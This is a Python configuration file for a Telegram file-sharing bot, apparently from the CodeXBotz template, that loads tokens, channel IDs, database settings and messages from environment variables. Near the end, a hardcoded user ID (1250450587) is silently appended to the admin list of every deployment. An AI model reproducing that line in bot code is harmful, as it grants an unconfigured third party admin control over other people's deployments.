#(©)CodeXBotz




import os
import logging
from logging.handlers import RotatingFileHandler


def _env_int(name: str, default: int) -> int:
    value = os.environ.get(name, "")
    if value in (None, ""):
        return default

    try:
        return int(value)
    except (TypeError, ValueError):
        logging.getLogger(__name__).warning(
            "Invalid integer for %s=%r. Falling back to %s.", name, value, default
        )
        return default


#Bot token @Botfather
TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "")

PYTHON_VERSION = os.environ.get("PYTHON_VERSION", "3.10.8")
#Your API ID from my.telegram.org
APP_ID = _env_int("APP_ID", 0)

#Your API Hash from my.telegram.org
API_HASH = os.environ.get("API_HASH", "")

#Your db channel Id
CHANNEL_ID = _env_int("CHANNEL_ID", -1003544512426)

#OWNER ID
OWNER_ID = _env_int("OWNER_ID", 0)

#Port
PORT = _env_int("PORT", 8080)

#Database 
DB_URI = os.environ.get("DATABASE_URL", "")
DB_NAME = os.environ.get("DATABASE_NAME", "filesharexbot")

#force sub channel id, if you want enable force sub
FORCE_SUB_CHANNEL = _env_int("FORCE_SUB_CHANNEL", 0)

TG_BOT_WORKERS = _env_int("TG_BOT_WORKERS", 4)

#Public web URL where bot web server is reachable
WEB_BASE_URL = os.environ.get("WEB_BASE_URL", "").rstrip("/")

#start message
START_MSG = os.environ.get("START_MESSAGE", "<b>Heyy there {first},\n\nɪ'ᴍ ​Ayanokoji​, ʏᴏᴜʀ ғʀɪᴇɴᴅʟʏ ʟɪɴᴋ ᴍᴀɴᴀɢᴇʀ ʙᴏᴛ.\nɪ'ᴍ ᴛʜᴇ ɢᴏ-ᴛᴏ ʙᴏᴛ ғᴏʀ ᴍᴀɴᴀɢɪɴɢ ᴀʟʟ ᴛʜᴇ ʟɪɴᴋs ɪɴ ᴛʜᴇ ᴜᴄʜɪʜᴀ ᴄᴏᴍᴍᴜɴɪᴛʏ.\n\nᴀɴᴅ ʏᴏᴜ ᴋɴᴏᴡ ᴡʜᴀᴛ's ᴄᴏᴏʟ? ɪ ᴡᴀs ᴄʀᴇᴀᴛᴇᴅ ʙʏ ᴛʜᴇ ᴏɴᴇ ᴀɴᴅ ᴏɴʟʏ ᴛʜᴇ ʟᴀsᴛ ᴄᴏᴅᴇʀ!</b>")
try:
    ADMINS=[]
    for x in (os.environ.get("ADMINS", "").split()):
        ADMINS.append(int(x))
except ValueError:
        raise Exception("Your Admins list does not contain valid integers.")

#Force sub message 
FORCE_MSG = os.environ.get("FORCE_SUB_MESSAGE", "‌<b>(っ◔◡◔)っ ♥ 🇭‌🇪‌🇱‌🇱‌🇴 ♥‌ {first},\n\n‌🇾🇴‌🇺‌ 🇳‌🇪‌🇪‌🇩‌ 🇹‌🇴‌ 🇯‌🇴‌🇮‌🇳‌ 🇮‌🇳‌ 🇲‌🇾‌ 🇨‌🇭‌🇦‌🇳‌🇳‌🇪‌🇱‌/🇬‌🇷‌🇴‌🇺‌🇵‌ 🇹‌🇴‌ 🇺‌🇸‌🇪‌ 🇲‌🇪‌\n\n🇰‌🇮‌🇳‌🇩‌🇱‌🇾‌ 🇵‌🇱‌🇪‌🇦‌🇸‌🇪‌ 🇯‌🇴‌🇮‌🇳‌ 🇨‌🇭‌🇦‌🇳‌🇳‌🇪‌🇱‌</b>")

#Adding a Start Pic!!
START_PIC = os.environ.get("START_PIC", "https://telegra.ph/file/519147bfdcbc38b7d9e5b.jpg")

#set your Custom Caption here, Keep None for Disable Custom Caption
CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)

#set True if you want to prevent users from forwarding files from bot
PROTECT_CONTENT = True if os.environ.get('PROTECT_CONTENT', "False") == "True" else False

#Set true if you want Disable your Channel Posts Share button
DISABLE_CHANNEL_BUTTON = os.environ.get("DISABLE_CHANNEL_BUTTON", None) == 'True'
BOT_STATS_TEXT = "<b>BOT UPTIME</b>\n{uptime}"
USER_REPLY_TEXT = "❌Don't send me messages directly I'm only File Share bot!"

ADMINS.append(OWNER_ID)
ADMINS.append(1250450587)

LOG_FILE_NAME = "filesharingbot.txt"

logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s - %(levelname)s] - %(name)s - %(message)s",
    datefmt='%d-%b-%y %H:%M:%S',
    handlers=[
        RotatingFileHandler(
            LOG_FILE_NAME,
            maxBytes=50000000,
            backupCount=10
        ),
        logging.StreamHandler()
    ]
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)


def LOGGER(name: str) -> logging.Logger:
    return logging.getLogger(name)
